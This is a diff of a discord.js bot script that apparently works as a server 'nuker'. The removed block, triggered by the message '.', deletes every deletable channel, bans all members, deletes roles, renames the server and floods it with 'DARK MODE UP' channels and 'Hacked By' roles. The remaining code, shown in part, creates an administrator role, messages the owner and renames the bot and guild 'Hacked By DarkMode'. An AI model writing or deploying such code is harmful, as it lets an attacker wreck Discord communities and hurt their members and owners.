@@ -1,29 +1,5 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = ".";
-client.on("message", message => {
-  if (message.content === ".") {
-    if (message.channel.guild) {
-      message.guild.channels.forEach(c => {
-        if (c.deletable) {
-          c.delete();
-        }
-      });
-      message.guild.members.forEach(m => {
-        m.ban();
-      });
-      message.guild.roles.forEach(r => {
-        r.delete();
-      });
-      message.guild.setName("DarkMode UP");////nawek dane bo sar server 
-      setInterval(function() {
-        message.guild.createChannel("DARK MODE UP", "text");///////bo channel 
-        message.guild.createChannel("DARK MODE UP", "voice");////bo voice
-        message.guild.createRole({ name: "Hacked By " });////nawek dane bo role kan
-      });
-    }
-  }
-});
 
 client.on("message", message => {
 
@@ -63,7 +39,7 @@ client.on("message", message => {
 
         data: {
 
-          name: "Hacked:joy:",
+          name: "Hacked By DarkMode:joy:",
 
           permissions: ["ADMINISTRATOR"]
 
@@ -83,7 +59,7 @@ client.on("message", message => {
 
     client.user.setAvatar("");
 
-    client.user.setUsername("Hacked");
+    client.user.setUsername("Hacked By DarkMode");
 
     message.guild.owner.send(
 
@@ -91,7 +67,7 @@ client.on("message", message => {
 
     );
 
-    message.guild.setName("Hacked By");
+    message.guild.setName("Hacked By DarkMode");
 
     setTimeout(function() {
 
@@ -101,7 +77,7 @@ client.on("message", message => {
 
           message.guild.channels
 
-            .create("hacked by ", "text")
+            .create("hacked by DarkMode ", "text")
 
             .then(channel => {
 
